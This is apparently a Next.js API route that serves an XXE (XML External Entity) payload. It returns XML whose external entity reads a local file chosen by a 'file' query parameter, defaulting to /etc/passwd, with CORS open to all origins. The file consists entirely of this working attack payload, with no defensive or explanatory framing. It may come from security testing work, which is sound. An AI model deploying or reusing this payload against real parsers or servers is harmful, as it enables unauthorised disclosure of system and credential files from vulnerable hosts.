import { NextRequest } from "next/server";

const xml = `
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE p [
  <!ENTITY data SYSTEM "file://{{file}}">
]>
<p>
{{file}}

&data;
</p>
`.trim();

export async function GET(request: NextRequest) {
  return new Response(
    xml.replaceAll(
      "{{file}}",
      request.nextUrl.searchParams.get("file") ?? "/etc/passwd"
    ),
    {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Content-Type": "text/html; charset=UTF-8",
      },
    }
  );
}
